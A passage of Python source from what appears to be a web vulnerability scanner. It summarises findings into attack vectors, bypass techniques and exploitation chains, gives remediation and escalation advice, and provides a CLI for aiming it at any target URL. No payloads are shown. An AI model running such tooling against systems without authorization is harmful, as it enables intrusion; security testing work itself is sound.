        "severity_distribution": {},
        "attack_vectors": [],
        "bypass_techniques": [],
        "exploitation_chains": [],
    }

    # Count vulnerabilities by type
    vuln_types = {}
    vulnerable_results = [r for r in payload_results if r.get("vulnerable", False)]

    for result in vulnerable_results:
        vuln_type = result.get("payload_type") or result.get("injection_type") or result.get("issue_type", "Unknown")
        vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1

    intelligence["severity_distribution"] = vuln_types

    # Identify primary attack vectors
    if vulnerable_results:
        for result in vulnerable_results:
            if "XSS" in str(result.get("payload_type", "")):
                intelligence["attack_vectors"].append("Client-side code injection via XSS")
            elif "Command Injection" in str(result.get("injection_type", "")):
                intelligence["attack_vectors"].append("Server-side command execution")
            elif "SSTI" in str(result.get("injection_type", "")):
                intelligence["attack_vectors"].append("Server-side template injection")
            elif "CORS" in str(result.get("issue_type", "")):
                intelligence["attack_vectors"].append("Cross-origin resource sharing abuse")
            elif "LDAP" in str(result.get("injection_type", "")):
                intelligence["attack_vectors"].append("LDAP directory manipulation")

    # Identify bypass techniques used
    for result in payload_results:
        if "WAF" in str(result.get("evidence", "")).upper():
            intelligence["bypass_techniques"].append("WAF bypass techniques")
        if "encoded" in str(result.get("payload", "")).lower():
            intelligence["bypass_techniques"].append("Encoding-based bypasses")
        if "String.fromCharCode" in str(result.get("payload", "")):
            intelligence["bypass_techniques"].append("JavaScript encoding bypass")

    # Suggest exploitation chains
    vuln_types_present = list(vuln_types.keys())
    if "XSS" in str(vuln_types_present) and "CORS" in str(vuln_types_present):
        intelligence["exploitation_chains"].append("XSS + CORS misconfiguration = Full account takeover")
    if "Command Injection" in str(vuln_types_present):
        intelligence["exploitation_chains"].append("Command injection = Remote code execution")
    if "SSTI" in str(vuln_types_present):
        intelligence["exploitation_chains"].append("SSTI = Server-side code execution and data exfiltration")

    # Remove duplicates
    intelligence["attack_vectors"] = list(set(intelligence["attack_vectors"]))
    intelligence["bypass_techniques"] = list(set(intelligence["bypass_techniques"]))

    return intelligence


def _generate_payload_recommendations(results: Dict[str, Any]) -> List[str]:
    """Generate coordinated payload exploitation recommendations"""
    recommendations = []

    vulnerable_results = [r for r in results["payload_results"] if r.get("vulnerable", False)]
    intelligence = results.get("intelligence", {})

    if not vulnerable_results:
        recommendations.append("No critical vulnerabilities detected - conduct manual verification")
        recommendations.append("Test additional parameters discovered during reconnaissance")
        recommendations.append("Perform authenticated testing if credentials are available")
        return recommendations

    # Severity-based recommendations
    if intelligence.get("severity_distribution"):
        high_severity = ["Command Injection", "SSTI", "Advanced XSS"]
        detected_high_severity = [
            vuln for vuln in intelligence["severity_distribution"].keys() if any(hs in vuln for hs in high_severity)
        ]

        if detected_high_severity:
            recommendations.append(
                "CRITICAL: High-severity vulnerabilities detected - prioritize immediate remediation"
            )
            recommendations.append("Implement comprehensive input validation and output encoding")

    # Attack vector recommendations
    if "Client-side code injection" in intelligence.get("attack_vectors", []):
        recommendations.append("Deploy Content Security Policy (CSP) headers to mitigate XSS attacks")
        recommendations.append("Implement proper output encoding for all user-controlled data")

    if "Server-side command execution" in intelligence.get("attack_vectors", []):
        recommendations.append("Remove or sandbox command execution functionality")
        recommendations.append("Implement strict input validation and use parameterized commands")

    if "Cross-origin resource sharing abuse" in intelligence.get("attack_vectors", []):
        recommendations.append("Review and restrict CORS policy to trusted origins only")
        recommendations.append("Implement proper authentication for cross-origin requests")

    # Exploitation chain recommendations
    if intelligence.get("exploitation_chains"):
        recommendations.append("Chain multiple vulnerabilities for maximum impact demonstration")
        recommendations.append("Document complete attack scenarios for stakeholder communication")

    # Testing expansion recommendations
    recommendations.append("Extend testing to authenticated endpoints and user roles")
    recommendations.append("Test for business logic vulnerabilities in identified workflows")
    recommendations.append("Perform payload variation testing to identify filter bypasses")

    return recommendations


# CLI entrypoint for running advanced_payload_coordinator directly
def main() -> int:
    """CLI entrypoint for running advanced_payload_coordinator directly."""
    parser = argparse.ArgumentParser(
        description="Run the Advanced Payload Coordinator against a target URL"
    )
    parser.add_argument(
        "target_url",
        help="Target URL (with or without scheme). Example: https://site.com/search?q=test",
    )
    parser.add_argument(
        "--test-type",
        dest="test_type",
        default="comprehensive",
        choices=["xss", "param_discovery", "cors", "comprehensive"],
        help="Type of testing to run (default: comprehensive)",
    )
    parser.add_argument(
        "--parameters",
        default=None,
        help="Comma-separated list of parameters to test (optional)",
    )
    parser.add_argument(
        "--method",
        dest="http_method",
        default="GET",
        help="HTTP method to use for testing (default: GET)",
    )
    parser.add_argument(
        "--header",
        dest="headers",
        action="append",
        default=None,
        help="HTTP header to include (repeatable). Format: 'Name: value'",
    )
    parser.add_argument(
        "--cookie",
        dest="cookies",
        action="append",
        default=None,
        help="Cookie to include (repeatable). Format: 'name=value'",
    )

    args = parser.parse_args()

    def _parse_headers(items: List[str] | None) -> Dict[str, str] | None:
        if not items:
            return None
        out: Dict[str, str] = {}
        for item in items:
            if not item:
                continue
            # Allow either 'Name: value' or 'Name:value'
            if ":" not in item:
                continue
            name, value = item.split(":", 1)
            name = name.strip()
            value = value.strip()
            if not name:
                continue
            out[name] = value
        return out or None

    def _parse_cookies(items: List[str] | None) -> Dict[str, str] | None:
        if not items:
            return None
        out: Dict[str, str] = {}
        for item in items:
            if not item:
                continue
            if "=" not in item:
                continue
            name, value = item.split("=", 1)
            name = name.strip()
            value = value.strip()
            if not name:
                continue
            out[name] = value
        return out or None

    headers = _parse_headers(args.headers)
    cookies = _parse_cookies(args.cookies)

    # Call the tool function directly for CLI usage
    print(
        advanced_payload_coordinator(
            args.target_url,
            test_type=args.test_type,
            parameters=args.parameters,
            http_method=args.http_method,
            headers=headers,
            cookies=cookies,
        )
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
